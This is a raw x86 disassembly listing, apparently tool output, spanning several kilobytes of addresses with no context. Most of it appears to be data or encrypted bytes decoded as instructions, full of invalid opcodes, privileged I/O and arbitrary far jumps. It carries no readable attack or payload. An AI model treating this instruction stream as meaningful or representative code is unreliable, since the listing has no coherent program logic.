  4028d5:	xor    BYTE PTR [ecx],ch
  4028d7:	push   ds
  4028d8:	mov    ds:0xb63e316c,eax
  4028dd:	(bad)  
  4028de:	sub    eax,0xcb25d4d8
  4028e3:	push   0x610cdf90
  4028e8:	sbb    al,0x3b
  4028ea:	aad    0xc4
  4028ec:	stos   BYTE PTR es:[edi],al
  4028ed:	cmp    eax,0xc2f12d29
  4028f2:	leave  
  4028f3:	fmul   QWORD PTR ds:0xf910242a
  4028f9:	inc    edx
  4028fa:	frstor [esi+0x72]
  4028fd:	popa   
  4028fe:	pop    es
  4028ff:	dec    eax
  402900:	pop    ebx
  402901:	das    
  402902:	mov    ds:0x80d4ab29,al
  402907:	mov    edx,0x8744b3fc
  40290c:	popa   
  40290d:	(bad)  
  40290f:	rcl    DWORD PTR [edi],1
  402911:	cdq    
  402912:	inc    ebp
  402913:	stos   DWORD PTR es:[di],eax
  402915:	les    edx,FWORD PTR [ecx+ecx*1-0x38]
  402919:	js     0x4028f5
  40291b:	add    edi,edi
  40291d:	mov    ebp,ss
  40291f:	ja     0x4028bc
  402921:	push   0x968de68e
  402926:	imul   ecx,DWORD PTR [esi+ebx*8],0xfffffff9
  40292a:	xor    al,0x26
  40292c:	mov    ah,BYTE PTR [eax]
  40292e:	mov    al,0xf1
  402930:	jno    0x402970
  402932:	cmp    esi,esi
  402934:	xor    bl,al
  402936:	cmc    
  402937:	dec    eax
  402938:	fidivr WORD PTR [esi-0x7f]
  40293b:	mov    ebx,0x49745983
  402940:	and    BYTE PTR [eax+0x5e],cl
  402943:	pop    esi
  402944:	cld    
  402945:	out    dx,al
  402946:	jne    0x4029ba
  402948:	jo     0x40291f
  40294a:	jnp    0x40293d
  40294c:	cwde   
  40294d:	jp     0x40293c
  40294f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402950:	inc    edx
  402951:	sbb    cl,BYTE PTR ds:0xff67c714
  402957:	outs   dx,BYTE PTR ds:[esi]
  402958:	fisttp DWORD PTR [ebx-0x7b8c8d9]
  40295e:	adc    BYTE PTR [eax],dl
  402960:	dec    esi
  402961:	xchg   esi,eax
  402962:	add    eax,0x852e0004
  402967:	stc    
  402968:	add    ebx,DWORD PTR [eax+0x5c]
  40296b:	adc    ecx,DWORD PTR [edx-0x60971c93]
  402971:	not    al
  402973:	in     eax,0xf9
  402975:	stos   DWORD PTR es:[edi],eax
  402976:	f2xm1  
  402978:	cwde   
  402979:	sub    al,BYTE PTR [esp+edx*4+0x5029e14f]
  402980:	push   eax
  402981:	mov    eax,0xbbee80
  402986:	sub    al,cl
  402988:	pop    edi
  402989:	sahf   
  40298a:	adc    BYTE PTR [edx+0x42],0xe0
  40298e:	mov    bl,0xc2
  402990:	mov    ebp,0x3218a5db
  402995:	dec    esi
  402996:	jnp    0x4029b2
  402998:	enter  0xf573,0xe9
  40299c:	test   DWORD PTR [ecx-0x2c],esi
  40299f:	test   ah,bl
  4029a1:	jg     0x4029a7
  4029a3:	mov    bh,BYTE PTR [ebx+0x75dc02f2]
  4029a9:	test   edi,edx
  4029ab:	btr    DWORD PTR [ebp-0x72],esi
  4029af:	sbb    al,0x90
  4029b1:	pop    ss
  4029b2:	mov    al,0xe6
  4029b4:	or     ah,bl
  4029b6:	ficomp WORD PTR [ebp-0x14]
  4029b9:	stc    
  4029ba:	ret    
  4029bb:	xchg   edi,eax
  4029bc:	and    DWORD PTR [ebx+0x4b],esi
  4029bf:	imul   ebp,esp,0x63e60e86
  4029c5:	enter  0xf0d1,0x36
  4029c9:	mov    edi,0x3bf262ef
  4029ce:	push   es
  4029cf:	inc    eax
  4029d0:	cmp    dh,dh
  4029d2:	ficom  DWORD PTR [edx+0x0]
  4029d5:	add    ch,BYTE PTR [ecx]
  4029d7:	sti    
  4029d8:	mov    dh,0xbf
  4029da:	sbb    al,0x77
  4029dc:	adc    ah,0xdc
  4029df:	mov    ds:0x1cbc2c61,eax
  4029e4:	add    dh,BYTE PTR [ecx]
  4029e6:	push   esp
  4029e7:	jns    0x402a35
  4029e9:	dec    ebx
  4029ea:	cmp    eax,0xa946909a
  4029ef:	test   eax,0xb08d33f
  4029f4:	xor    al,0x80
  4029f6:	stos   DWORD PTR es:[edi],eax
  4029f7:	nop
  4029f8:	cmp    eax,0xb46ff8f7
  4029fd:	icebp  
  4029fe:	mov    ebx,0x271dbac3
  402a03:	imul   ebx,DWORD PTR [edi+eiz*8],0x719bff1
  402a0a:	mov    dl,0xd2
  402a0c:	sub    al,0x5f
  402a0e:	adc    bh,bh
  402a10:	pop    ss
  402a11:	sub    DWORD PTR [esi+0x19b9ef64],esp
  402a17:	mov    bh,BYTE PTR [edx]
  402a19:	sub    DWORD PTR [ebp+0xd25904d],eax
  402a1f:	mov    esp,0x515ecde5
  402a24:	jbe    0x402a8f
  402a26:	mov    ds:0x85399ab0,eax
  402a2b:	push   ecx
  402a2c:	jp     0x402a44
  402a2e:	les    eax,FWORD PTR ds:[esi]
  402a31:	mov    bh,0x9e
  402a33:	ret    0x2974
  402a36:	lahf   
  402a37:	sub    DWORD PTR [eax],0xffffffb6
  402a3a:	pop    edx
  402a3b:	call   0x4cc08d6d
  402a40:	or     al,0xd0
  402a42:	dec    edi
  402a43:	xchg   ebx,eax
  402a44:	cld    
  402a45:	adc    bh,ch
  402a47:	and    BYTE PTR [edx],bh
  402a49:	mov    ss,esi
  402a4b:	cmp    ebx,DWORD PTR [esi]
  402a4d:	mov    dh,0x73
  402a4f:	mov    WORD PTR [eax+0xe],es
  402a52:	or     esi,DWORD PTR [edi+ecx*4-0x1d19b84b]
  402a59:	mov    bl,BYTE PTR [eax+0x27]
  402a5c:	not    DWORD PTR [edi-0x25]
  402a5f:	scas   al,BYTE PTR es:[edi]
  402a60:	fldenv [edi]
  402a62:	dec    edx
  402a63:	loop   0x402aad
  402a65:	pop    esp
  402a66:	retf   
  402a67:	aas    
  402a68:	pop    esi
  402a69:	sbb    ah,0xc8
  402a6c:	std    
  402a6d:	scas   eax,DWORD PTR es:[edi]
  402a6e:	sub    ebp,DWORD PTR [ecx]
  402a70:	sbb    al,BYTE PTR [ebp+0x21229372]
  402a76:	add    ebp,DWORD PTR [edi-0x7a]
  402a79:	pop    ebp
  402a7a:	iret   
  402a7b:	test   DWORD PTR [edi],esp
  402a7d:	xor    ah,BYTE PTR [esi-0x6d]
  402a80:	mov    ebx,0x68a49463
  402a85:	rep ins DWORD PTR es:[edi],dx
  402a87:	push   esp
  402a88:	cli    
  402a89:	gs push 0x50
  402a8c:	dec    ecx
  402a8d:	mov    DWORD PTR [ebp-0x480df66],ebp
  402a93:	div    DWORD PTR [ecx]
  402a95:	jb     0x402a78
  402a97:	clc    
  402a98:	fldcw  WORD PTR [ecx-0x48]
  402a9b:	bound  esp,QWORD PTR [ebp-0x73]
  402a9e:	fwait
  402a9f:	dec    edi
  402aa0:	xchg   ecx,eax
  402aa1:	jg     0x402ab2
  402aa3:	mov    eax,ds:0x9eb8dd74
  402aa8:	inc    edx
  402aa9:	add    al,0x9
  402aab:	pop    ds
  402aac:	fild   WORD PTR [edi+0x73]
  402aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ab0:	sub    bh,BYTE PTR [edx+0x628f1a2d]
  402ab6:	loopne 0x402ad0
  402ab8:	push   ecx
  402ab9:	lahf   
  402aba:	shufps xmm2,XMMWORD PTR [edi],0xf2
  402abe:	push   es
  402abf:	cdq    
  402ac0:	cmp    DWORD PTR [eax-0x5e3e581a],edx
  402ac6:	out    0x1e,eax
  402ac8:	cmc    
  402ac9:	nop
  402aca:	dec    esp
  402acb:	sbb    ch,BYTE PTR [edx+0xd3a8e14]
  402ad1:	(bad)  
  402ad2:	mov    al,ds:0xfbbd369e
  402ad7:	xchg   ebx,eax
  402ad8:	aam    0x0
  402ada:	add    cl,BYTE PTR [ebx+ecx*1]
  402add:	mov    esp,0x597de8fe
  402ae2:	xor    edi,DWORD PTR [ecx-0x16]
  402ae5:	push   0xd3e0bb9d
  402aea:	es inc edx
  402aec:	sahf   
  402aed:	cmp    dh,BYTE PTR [edi+0x23]
  402af0:	adc    BYTE PTR [ecx-0x68],bh
  402af3:	dec    ebp
  402af4:	imul   edi,DWORD PTR [ebx],0x7a
  402af7:	mov    ebp,0xb12570e8
  402afc:	mov    ch,ch
  402afe:	inc    esi
  402aff:	inc    edx
  402b00:	jl     0x402aa7
  402b02:	add    al,0x5d
  402b04:	scas   eax,DWORD PTR es:[edi]
  402b05:	daa    
  402b06:	dec    ebp
  402b07:	add    bh,BYTE PTR [edi-0x5a]
  402b0a:	mov    ecx,0x6e2e8e79
  402b0f:	mov    bl,0x58
  402b11:	imul   ecx,DWORD PTR [eax],0xffffffaa
  402b14:	mov    ebx,DWORD PTR [esp+edi*1+0x7f]
  402b18:	sbb    eax,0xe0295b90
  402b1d:	ds pop ds
  402b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b20:	jb     0x402aa8
  402b22:	inc    esp
  402b23:	jo     0x402ba2
  402b25:	mov    dh,BYTE PTR [ecx-0x70f3c00e]
  402b2b:	sbb    bh,dl
  402b2d:	jge    0x402b28
  402b2f:	shl    DWORD PTR [ebx+ebx*8+0xa],0xc
  402b34:	ret    
  402b35:	lods   al,BYTE PTR ds:[esi]
  402b36:	dec    esp
  402b37:	push   ebx
  402b38:	mov    DWORD PTR [ecx+0x7],eax
  402b3b:	pop    eax
  402b3c:	mov    eax,ds:0xc2715ca0
  402b41:	mov    DWORD PTR [edi+0x2b],edx
  402b44:	imul   edx,DWORD PTR [edx+0x269830b3],0x60
  402b4b:	or     BYTE PTR [edx],0xe1
  402b4e:	hlt    
  402b4f:	add    al,0xba
  402b51:	retf   
  402b52:	(bad)  
  402b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b54:	or     BYTE PTR [eax-0x11],0x71
  402b58:	ret    
  402b59:	stos   BYTE PTR es:[edi],al
  402b5a:	inc    edi
  402b5b:	xor    dh,BYTE PTR [esi-0x31]
  402b5e:	and    al,0x16
  402b60:	push   esp
  402b61:	pushf  
  402b62:	in     al,0xe9
  402b64:	je     0x402ae9
  402b66:	std    
  402b67:	rcr    esi,0xe6
  402b6a:	test   DWORD PTR [edx+ecx*1],ebp
  402b6d:	loope  0x402ba7
  402b6f:	dec    esp
  402b70:	jmp    0x402b63
  402b72:	push   edi
  402b73:	cld    
  402b74:	sbb    dh,BYTE PTR [eax-0x1e]
  402b77:	jmp    0xfa95:0x82b7a5b2
  402b7e:	or     ch,dl
  402b80:	sbb    BYTE PTR [ebp+0x72],ah
  402b83:	adc    DWORD PTR [eax],ecx
  402b85:	jne    0x402b07
  402b87:	mov    ch,0x6
  402b89:	jge    0x402bb7
  402b8b:	xor    al,0x64
  402b8d:	rcl    BYTE PTR [ecx+0x6a],cl
  402b90:	mov    ds:0x1d953bb0,eax
  402b95:	mov    ds:0x7fe52196,eax
  402b9a:	enter  0xf17e,0x26
  402b9e:	cmp    edi,ebx
  402ba0:	sbb    al,0xe5
  402ba2:	lahf   
  402ba3:	mov    ds:0xbd22d8c0,eax
  402ba8:	ins    BYTE PTR es:[edi],dx
  402ba9:	xor    bl,al
  402bab:	stos   DWORD PTR es:[edi],eax
  402bac:	jb     0x402bf3
  402bae:	or     eax,0xa3fd880d
  402bb3:	xor    eax,0xae3e2c8c
  402bb8:	adc    al,0x6
  402bba:	pop    esi
  402bbb:	dec    ebp
  402bbc:	js     0x402bd3
  402bbe:	cmp    BYTE PTR [ebx],bh
  402bc0:	and    eax,0x2e0e5287
  402bc5:	or     ch,bh
  402bc7:	push   edi
  402bc8:	fwait
  402bc9:	adc    DWORD PTR [edx],eax
  402bcb:	clc    
  402bcc:	cli    
  402bcd:	popa   
  402bce:	and    esp,ebp
  402bd0:	lods   eax,DWORD PTR ds:[esi]
  402bd1:	push   ds
  402bd2:	cs popf 
  402bd4:	ins    BYTE PTR es:[edi],dx
  402bd5:	xor    bl,BYTE PTR [esi+0x4d]
  402bd8:	xchg   esp,eax
  402bd9:	adc    eax,0xaab94917
  402bde:	fdiv   QWORD PTR [ebx]
  402be0:	jge    0x402b87
  402be2:	shl    DWORD PTR [edi+0x482a1c85],0xe8
  402be9:	je     0x402c1e
  402beb:	je     0x402c59
  402bed:	pushf  
  402bee:	pop    ecx
  402bef:	or     al,BYTE PTR [esi]
  402bf1:	fist   DWORD PTR [ecx]
  402bf3:	mov    dl,0xfa
  402bf5:	(bad)  
  402bf7:	das    
  402bf8:	stos   BYTE PTR es:[edi],al
  402bf9:	(bad)  
  402bfa:	lods   al,BYTE PTR ds:[esi]
  402bfb:	xor    eax,0x8b122698
  402c00:	lods   eax,DWORD PTR ds:[esi]
  402c01:	xchg   ebp,eax
  402c02:	mov    es,eax
  402c04:	out    0xc1,al
  402c06:	stos   BYTE PTR es:[edi],al
  402c07:	cvtpi2ps xmm0,QWORD PTR [ebx+eax*1+0x49]
  402c0c:	inc    edi
  402c0d:	mov    edi,0x8159d07a
  402c12:	mov    dl,0x3a
  402c14:	cmp    DWORD PTR [eax],0xcd84483a
  402c1a:	js     0x402c5f
  402c1c:	push   cs
  402c1d:	hlt    
  402c1e:	or     edx,DWORD PTR [edi-0x2a4447a9]
  402c24:	xor    BYTE PTR [edx*1+0x74c37c99],bl
  402c2b:	pusha  
  402c2c:	int    0x2c
  402c2e:	into   
  402c2f:	dec    edx
  402c30:	mov    edi,0x90b95c3e
  402c35:	pop    edx
  402c36:	cmp    eax,0xa369310c
  402c3b:	outs   dx,DWORD PTR ds:[esi]
  402c3c:	loope  0x402c4c
  402c3e:	ins    DWORD PTR es:[edi],dx
  402c3f:	adc    BYTE PTR [ecx+0x5302fa32],bh
  402c45:	mov    eax,ds:0xe1f756ff
  402c4a:	xchg   esi,eax
  402c4b:	aad    0xe2
  402c4d:	aam    0xf
  402c4f:	scas   eax,DWORD PTR es:[edi]
  402c50:	(bad)  
  402c51:	xchg   ebx,eax
  402c52:	mov    esp,DWORD PTR [edi+0x57fb9256]
  402c58:	rcr    BYTE PTR [ebx+0x6a71add9],0xaa
  402c5f:	out    dx,al
  402c60:	fs mov cl,0xb8
  402c63:	scas   al,BYTE PTR es:[edi]
  402c64:	sbb    eax,0x6611117b
  402c69:	fs icebp 
  402c6b:	mov    cl,0x3d
  402c6d:	mov    al,ds:0xc923c4f
  402c72:	pop    ss
  402c73:	leave  
  402c74:	pop    eax
  402c75:	aaa    
  402c76:	out    dx,al
  402c77:	pop    esi
  402c78:	jne    0x402c9f
  402c7a:	imul   ebp,DWORD PTR [esi+ecx*2],0x21
  402c7e:	adc    DWORD PTR [edi-0x587074cd],esp
  402c84:	aaa    
  402c85:	int    0xb4
  402c87:	pop    ecx
  402c88:	xchg   BYTE PTR [ecx],dh
  402c8a:	push   0x7e
  402c8c:	test   eax,0x4e5c9d7c
  402c91:	pop    edi
  402c92:	add    al,0xb9
  402c94:	leave  
  402c95:	inc    esp
  402c96:	les    esi,FWORD PTR [esi+0x12815823]
  402c9c:	icebp  
  402c9d:	pop    esp
  402c9e:	xchg   esp,eax
  402c9f:	cld    
  402ca0:	cmp    DWORD PTR [eax-0x3a4049b6],edi
  402ca6:	sahf   
  402ca7:	test   al,0xf9
  402ca9:	repnz ins DWORD PTR es:[edi],dx
  402cab:	mov    ebx,DWORD PTR [eax+edi*2]
  402cae:	mov    al,ds:0x462447e6
  402cb3:	push   ebx
  402cb4:	jmp    0xeb0f:0xf9d35777
  402cbb:	jmp    0x402c9d
  402cbd:	repz sub ebx,ebx
  402cc0:	mul    DWORD PTR [ecx+0x386f51b]
  402cc6:	in     eax,0x3e
  402cc8:	mov    dh,0xec
  402cca:	sbb    eax,0xe0ec08e9
  402ccf:	scas   al,BYTE PTR es:[edi]
  402cd0:	call   0x2708:0x220105cd
  402cd7:	dec    esi
  402cd8:	jge    0x402d1d
  402cda:	pop    ebx
  402cdb:	test   DWORD PTR [eax+0x17],0x4ce6ab73
  402ce2:	popf   
  402ce3:	pushf  
  402ce4:	cmp    cl,BYTE PTR [ebp+0xb3f2264]
  402cea:	push   es
  402ceb:	jp     0x402cb2
  402ced:	mov    cs,esi
  402cef:	pop    ecx
  402cf0:	loop   0x402c7a
  402cf2:	mov    ebp,0x709e251f
  402cf7:	cwde   
  402cf8:	cmp    eax,0x680f342b
  402cfd:	in     eax,0x3
  402cff:	mov    ss,esp
  402d01:	and    DWORD PTR [eax-0x51],esi
  402d04:	and    al,0x59
  402d06:	sub    eax,0x5e36e782
  402d0b:	mov    ebp,ecx
  402d0d:	imul   ebp,DWORD PTR ds:0x7768d48,0xefe29d6
  402d17:	mov    al,ah
  402d19:	push   edi
  402d1a:	pop    esi
  402d1b:	mov    ch,0x76
  402d1d:	add    edi,DWORD PTR [edi-0x3ce72f94]
  402d23:	dec    edx
  402d24:	mov    edx,0xfa4124ac
  402d29:	inc    esi
  402d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d2b:	push   ds
  402d2c:	and    ebx,edi
  402d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d2f:	jmp    0x402cde
  402d31:	retf   0x612e
  402d34:	mov    al,ds:0x301bbe22
  402d39:	dec    ecx
  402d3a:	push   esp
  402d3b:	inc    ecx
  402d3c:	icebp  
  402d3d:	mov    DWORD PTR [ebp+0x40],ebx
  402d40:	pop    eax
  402d41:	fist   DWORD PTR [ebx-0xa]
  402d44:	push   0xffffffa0
  402d46:	ret    
  402d47:	and    esi,0x46
  402d4a:	mov    ecx,0x4e430e37
  402d4f:	xchg   edx,eax
  402d50:	ret    
  402d51:	jp     0x402d12
  402d53:	(bad)  
  402d54:	add    BYTE PTR [esi-0xa],bh
  402d57:	lahf   
  402d58:	int    0xca
  402d5a:	push   eax
  402d5b:	mov    dl,0x4d
  402d5d:	ror    DWORD PTR [ebx],cl
  402d5f:	dec    ebp
  402d60:	retf   
  402d61:	lds    edx,FWORD PTR [ebx]
  402d63:	arpl   WORD PTR [ebx-0x1a],si
  402d66:	lds    eax,FWORD PTR [ebp+0x56]
  402d69:	loope  0x402d83
  402d6b:	jnp    0x402dd8
  402d6d:	popa   
  402d6e:	sub    esp,DWORD PTR [ebp+0x7]
  402d71:	jb     0x402d92
  402d73:	repnz cwde 
  402d75:	in     eax,0xee
  402d77:	jb     0x402d0e
  402d79:	adc    BYTE PTR ds:0xa7337b28,0xbd
  402d80:	push   edx
  402d81:	mov    ebp,0x9c6163c9
  402d86:	ror    DWORD PTR [edi],0xd8
  402d89:	jbe    0x402d49
  402d8b:	mov    bl,0xa0
  402d8d:	stc    
  402d8e:	loop   0x402d39
  402d90:	and    BYTE PTR [edx],ah
  402d92:	or     dh,al
  402d94:	xor    edx,esp
  402d96:	jmp    0x5ea0dc6d
  402d9b:	cmp    DWORD PTR [esi+0x0],ebx
  402d9e:	jmp    0xd078:0x5144bd33
  402da5:	loope  0x402d8b
  402da7:	inc    ebx
  402da8:	mov    eax,0x8670e461
  402dad:	iret   
  402dae:	jmp    0xf9be9223
  402db3:	adc    eax,0xc7b801f8
  402db8:	push   eax
  402db9:	inc    edx
  402dba:	dec    edi
  402dbb:	push   ebx
  402dbc:	or     eax,0x8f8db847
  402dc1:	aas    
  402dc2:	out    0xfe,eax
  402dc4:	inc    edx
  402dc5:	in     al,0xbf
  402dc7:	(bad)  
  402dc9:	fsub   st,st(4)
  402dcb:	xchg   DWORD PTR [edi+0x6cc03f57],esp
  402dd1:	mov    ch,0x5b
  402dd3:	adc    al,0x6
  402dd5:	inc    ebp
  402dd6:	jne    0x402d9f
  402dd8:	js     0x402de0
  402dda:	xor    dl,BYTE PTR [eax-0x4ee353fc]
  402de0:	dec    edx
  402de1:	mov    al,0x5b
  402de3:	inc    esi
  402de4:	mov    eax,0x5c42f9b0
  402de9:	(bad)  
  402dea:	xchg   esi,eax
  402deb:	inc    eax
  402dec:	aaa    
  402ded:	push   cs
  402dee:	add    al,0x15
  402df0:	adc    DWORD PTR [ebx],esp
  402df2:	ss cmp al,0x0
  402df5:	retf   
  402df6:	(bad)  [esi-0xf33ac6c]
  402dfc:	inc    esp
  402dfd:	mov    edi,0x82c0729e
  402e02:	lds    ebx,FWORD PTR [edx-0x1e]
  402e05:	out    dx,eax
  402e06:	neg    BYTE PTR [ecx-0x40a69393]
  402e0c:	mov    esi,0x8c31793
  402e11:	xchg   BYTE PTR [ebp-0x5b],ch
  402e14:	dec    ebx
  402e15:	mov    esi,0xc4c36c1f
  402e1a:	loopne 0x402dd8
  402e1c:	out    0x3e,eax
  402e1e:	loope  0x402e52
  402e20:	sub    DWORD PTR [ebp-0x5b2167fc],0x5d
  402e27:	cli    
  402e28:	sub    eax,0x46fe003d
  402e2d:	les    ebp,FWORD PTR [edi*2+0x1b6a0545]
  402e34:	fwait
  402e35:	shl    BYTE PTR [eax],1
  402e37:	mov    bl,0x28
  402e39:	xchg   ebx,eax
  402e3a:	xor    esi,DWORD PTR [ebx-0x751738f2]
  402e40:	loopne 0x402ea6
  402e42:	sub    eax,0x28b056f2
  402e47:	inc    edi
  402e48:	fimul  DWORD PTR [edx]
  402e4a:	jno    0x402ec9
  402e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e4d:	and    ah,bl
  402e4f:	or     ebx,DWORD PTR [ecx+0x79]
  402e52:	mov    al,0x31
  402e54:	sub    bl,bh
  402e56:	in     al,dx
  402e57:	addr16 jg 0x402e96
  402e5a:	mov    ds:0x4693140f,al
  402e5f:	in     al,0x4b
  402e61:	sub    esp,DWORD PTR [ebp+0x42]
  402e64:	stos   DWORD PTR es:[edi],eax
  402e65:	inc    edi
  402e66:	pop    edx
  402e67:	int3   
  402e68:	and    al,0xda
  402e6a:	dec    esi
  402e6b:	mov    ecx,0xcbfff4cc
  402e70:	fiadd  WORD PTR ds:0x1f1d0f7b
  402e76:	lea    edx,[esi-0x7aa2e064]
  402e7c:	pop    eax
  402e7d:	imul   eax,DWORD PTR [ebx+edi*4+0x53],0x562b38a8
  402e85:	icebp  
  402e86:	int3   
  402e87:	aad    0x7
  402e89:	gs fincstp 
  402e8c:	bound  ebp,QWORD PTR [edi]
  402e8e:	enter  0xb50,0x7a
  402e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e93:	call   0x8d4f5d72
  402e98:	out    dx,eax
  402e99:	mov    eax,ds:0x8b3a57bb
  402e9e:	cmp    bl,BYTE PTR [ebx+0x1a]
  402ea1:	outs   dx,BYTE PTR ds:[esi]
  402ea2:	lods   eax,DWORD PTR ds:[esi]
  402ea3:	retf   
  402ea4:	inc    esi
  402ea5:	sub    DWORD PTR [edi],ebx
  402ea7:	xchg   ecx,eax
  402ea8:	test   eax,0xb8d99b47
  402ead:	pop    ecx
  402eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eaf:	aam    0x62
  402eb1:	inc    esp
  402eb2:	or     BYTE PTR [ebx+0x1a],al
  402eb5:	int    0xb
  402eb7:	(bad)  
  402eb8:	push   ds
  402eb9:	mov    eax,ds:0xedb1fb61
  402ebe:	imul   edx,eax,0x39ab7896
  402ec4:	jo     0x402f38
  402ec6:	int    0x3e
  402ec8:	pushf  
  402ec9:	cdq    
  402eca:	ret    
  402ecb:	mov    esi,0xfda3b1e2
  402ed0:	xor    al,0x62
  402ed2:	xchg   esp,eax
  402ed3:	push   ss
  402ed4:	pop    ds
  402ed5:	push   esp
  402ed6:	mov    ds:0x10d6469e,al
  402edb:	test   eax,0x75e5c0b
  402ee0:	inc    esp
  402ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee2:	test   BYTE PTR [ecx+0x4b],bl
  402ee5:	and    DWORD PTR [edx-0x7e],esp
  402ee8:	and    eax,0xffffffc6
  402eeb:	push   esi
  402eec:	lods   eax,DWORD PTR ds:[esi]
  402eed:	adc    eax,0x142085c5
  402ef2:	adc    eax,0xc5753efd
  402ef7:	lds    ebp,FWORD PTR [ebp+0x27]
  402efa:	pop    ds
  402efb:	repz jbe 0x402e9f
  402efe:	sbb    DWORD PTR [eax-0x19af7a4d],edi
  402f04:	popf   
  402f05:	fs arpl ax,cx
  402f08:	pop    ds
  402f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f0a:	inc    ecx
  402f0b:	repnz mov ch,0x52
  402f0e:	jge    0x402ed7
  402f10:	mov    dh,0x3a
  402f12:	jmp    0x5577:0x5d9b47ff
  402f19:	out    0xa7,al
  402f1b:	lea    edi,[ebp+0x61]
  402f1e:	ins    BYTE PTR es:[edi],dx
  402f1f:	or     cl,BYTE PTR [edi+0x19ffbd8c]
  402f25:	adc    BYTE PTR [eax-0x6e],ch
  402f28:	push   ss
  402f29:	imul   esi,DWORD PTR [ecx-0x61],0x5
  402f2d:	cdq    
  402f2e:	push   ds
  402f2f:	pop    ebp
  402f30:	add    BYTE PTR [esi],dl
  402f32:	fnstcw WORD PTR [ecx+ebx*8]
  402f35:	fisttp WORD PTR [ebx]
  402f37:	jge    0x402f16
  402f39:	int3   
  402f3a:	sub    esi,0xffffffc0
  402f3d:	mov    ch,0x8
  402f3f:	jge    0x402eee
  402f41:	inc    ebx
  402f42:	ds push ss
  402f44:	das    
  402f45:	out    0x9f,eax
  402f47:	ins    BYTE PTR es:[edi],dx
  402f48:	add    ah,BYTE PTR [eax+0x52d88539]
  402f4e:	sbb    eax,0x70f31ba
  402f53:	test   al,0x6d
  402f55:	or     esp,esi
  402f57:	(bad)  
  402f58:	fcomp  QWORD PTR [ebx+0x326c1eec]
  402f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f5f:	mov    ah,0xb9
  402f61:	xchg   esp,eax
  402f62:	cld    
  402f63:	mov    bl,0x89
  402f65:	call   0x733e:0xe84e9de9
  402f6c:	out    dx,eax
  402f6d:	inc    eax
  402f6e:	repnz sub al,0x2c
  402f71:	(bad)  
  402f72:	mov    esp,0x2be0e998
  402f77:	sti    
  402f78:	aam    0x69
  402f7a:	sbb    eax,0x75da1678
  402f7f:	sub    DWORD PTR ds:0x7f53d3e0,0xffffffd1
  402f86:	das    
  402f87:	sbb    eax,0x362f1f86
  402f8c:	adc    eax,0x11e71e07
  402f91:	stc    
  402f92:	fsubr  QWORD PTR [edx-0x38]
  402f95:	mov    ebx,0x7a0d35f1
  402f9a:	popa   
  402f9b:	int    0x9f
  402f9d:	cs mul esi
  402fa0:	dec    ecx
  402fa1:	pop    ebx
  402fa2:	retf   
  402fa3:	xor    al,0x4d
  402fa5:	daa    
  402fa6:	sbb    al,0x43
  402fa8:	int3   
  402fa9:	dec    ebx
  402faa:	push   0xffffff8e
  402fac:	sbb    eax,0x586e7a19
  402fb1:	outs   dx,BYTE PTR ds:[esi]
  402fb2:	xchg   edx,eax
  402fb3:	mov    esp,0x42148588
  402fb8:	mov    esi,DWORD PTR [eax+ebx*4-0x38]
  402fbc:	ds out dx,al
  402fbe:	in     eax,0x75
  402fc0:	inc    esi
  402fc1:	je     0x402f7e
  402fc3:	cli    
  402fc4:	shl    ah,0xd
  402fc7:	ror    DWORD PTR [edi],cl
  402fc9:	adc    al,0x47
  402fcb:	push   ebx
  402fcc:	inc    edx
  402fcd:	mov    DWORD PTR [esp+edi*4+0x6],edi
  402fd1:	pusha  
  402fd2:	mov    bl,0x8b
  402fd4:	mov    bh,0xf4
  402fd6:	ror    ah,1
  402fd8:	adc    DWORD PTR [edx-0x69b379cc],0x3ea2ce6
  402fe2:	icebp  
  402fe3:	ror    BYTE PTR [ebp+0x4f],0xea
  402fe7:	(bad)  [ecx-0x56]
  402fea:	dec    esp
  402feb:	leave  
  402fec:	pop    ebx
  402fed:	pop    ss
  402fee:	aaa    
  402fef:	xchg   edx,eax
  402ff0:	cmp    eax,0x9122fc67
  402ff5:	pop    eax
  402ff6:	mov    dl,0x65
  402ff8:	fxch   st(3)
  402ffa:	pop    edx
  402ffb:	ret    
  402ffc:	pop    edx
  402ffd:	aaa    
  402ffe:	and    BYTE PTR [esi+esi*1-0x186d6e13],bh
  403005:	lahf   
  403006:	jecxz  0x402fb2
  403008:	lods   eax,DWORD PTR ds:[esi]
  403009:	das    
  40300a:	fmul   st,st(3)
  40300c:	mov    al,0xe8
  40300e:	int    0x47
  403010:	mov    ss,WORD PTR [esi+0x6]
  403013:	ror    bl,cl
  403015:	jp     0x403051
  403017:	cmp    dl,BYTE PTR [edx+esi*8]
  40301a:	or     ebp,eax
  40301c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40301d:	fmul   DWORD PTR [esi+0x4a]
  403020:	int    0x6e
  403022:	aas    
  403023:	aam    0xf6
  403025:	push   esp
  403026:	cmc    
  403027:	test   eax,0x480e4ae
  40302c:	dec    edx
  40302d:	pause  
  40302f:	shr    DWORD PTR [ecx],1
  403031:	cmp    BYTE PTR [edi+ecx*2+0x785b0019],dh
  403038:	not    BYTE PTR [ebp+0x11]
  40303b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40303c:	aaa    
  40303d:	sub    DWORD PTR [esi-0x219a0a47],0x69
  403044:	stos   BYTE PTR es:[edi],al
  403045:	dec    ecx
  403046:	xchg   edi,eax
  403047:	mov    esi,0xe03fbfd4
  40304c:	jne    0x403084
  40304e:	loope  0x4030cb
  403050:	push   ecx
  403051:	sbb    edi,DWORD PTR ds:0x761e7950
  403057:	dec    esi
  403058:	inc    edi
  403059:	scas   eax,DWORD PTR es:[edi]
  40305a:	or     esp,edi
  40305c:	push   cs
  40305d:	(bad)  [ebx-0x42a3acd7]
  403063:	sub    al,0xed
  403065:	push   ss
  403066:	dec    ebx
  403067:	imul   eax,edi,0xfffffff8
  40306a:	pushf  
  40306b:	cld    
